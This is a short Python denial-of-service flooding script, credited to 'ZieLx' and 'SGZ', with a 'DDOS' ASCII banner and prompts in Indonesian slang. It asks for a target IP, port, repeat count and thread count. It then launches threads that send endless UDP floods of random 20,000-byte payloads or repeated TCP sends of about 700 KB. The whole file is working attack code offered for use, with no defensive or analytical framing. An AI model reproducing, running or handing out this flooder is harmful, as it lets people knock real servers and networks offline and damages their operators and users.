#Made In ZieLx
import random
import socket
import threading
import os

os.system("clear")
print("""\033[95m
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        """)
print("      \033[94m#-- MADE IN ZIELX X SGZ --#")
print("      --> JANGAN ABUSE KONTOL <--")
print("      #-- Z1#7872 X SGZ#0963 --#\n")

choice = str(input("\033[93m =====> \033[91m[$] Afa Iyah (y/n) : "))
ip = str(input("\033[93m =====> \033[91m[•] IP Target : "))
port = int(input("\033[93m =====> \033[91m[+] Port : "))
times = int(input("\033[93m =====> \033[91m[×] Times : "))
threads = int(input("\033[93m =====> \033[91m[=] Threads : "))

def kontol():
	data = random._urandom(20000)
	i = random.choice(("[$]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m ZieLx And SGZ Attack!!!\033[93m =====> \033[92m{}:{}".format(ip,port))
		except:
			print("\033[93m[$] \033[91m ZieLx And SGZ Attack!!!\033[93m =====> \033[92m{}:{}".format(ip,port))
			

def kontol2():
	data = random._urandom(696969)
	i = random.choice(("[+]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m ZieLx And SGZ Attack!!!\033[93m =====> \033[92m{}:{}".format(ip,port))
		except:
			s.close()
			print("\033[93m[*] \033[91m ZieLx And SGZ Attack!!!\033[93m =====> \033[92m{}:{}".format(ip,port))

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = kontol)
		th.start()
	else:
		th = threading.Thread(target = kontol2)
		th.start()